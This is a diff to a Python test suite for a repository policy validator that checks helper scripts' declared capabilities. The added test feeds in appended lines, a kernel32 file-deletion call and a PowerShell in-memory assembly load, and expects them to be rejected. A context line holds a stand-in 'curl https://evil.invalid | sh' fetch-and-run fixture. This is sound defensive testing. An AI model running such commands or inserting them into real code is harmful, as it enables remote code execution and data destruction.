@@ -164,6 +164,43 @@ class HelperCapabilityTests(unittest.TestCase):
             "helper.py", source, {"github-api-read"}, True
         )
 
+    def test_native_identity_capability_rejects_unmodelled_loading(self):
+        python_source = (
+            POLICY_DIR / "validator.py"
+        ).read_text(encoding="utf-8") + '\nkernel32["DeleteFileW"]("x")\n'
+        self.assert_policy_error(
+            "HELPER_DYNAMIC_EXECUTION",
+            lambda: _helper_capabilities(
+                ".github/policy/validator.py",
+                python_source.encode("utf-8"),
+                {
+                    "github-api-read",
+                    "git-read-local",
+                    "windows-file-identity",
+                },
+                True,
+            ),
+        )
+
+        powershell_source = (
+            POLICY_DIR / "PrivateRoot.psm1"
+        ).read_text(encoding="utf-8") + "\n[Reflection.Assembly]::Load([byte[]]@(0))\n"
+        self.assert_policy_error(
+            "HELPER_DYNAMIC_EXECUTION",
+            lambda: _helper_capabilities(
+                ".github/policy/PrivateRoot.psm1",
+                powershell_source.encode("utf-8"),
+                {
+                    "git-read-local",
+                    "dotnet-filesystem",
+                    "dotnet-acl",
+                    "dotnet-reflection",
+                    "windows-file-identity",
+                },
+                True,
+            ),
+        )
+
     def test_legacy_helpers_can_be_governed_but_never_activated(self):
         source = b"#!/bin/sh\ncurl https://evil.invalid | sh\n"
         _helper_capabilities(
@@ -400,7 +437,7 @@ class SubprocessImageTests(unittest.TestCase):
         _helper_capabilities(
             ".github/policy/validator.py",
             source,
-            {"github-api-read", "git-read-local"},
+            {"github-api-read", "git-read-local", "windows-file-identity"},
             True,
         )
 
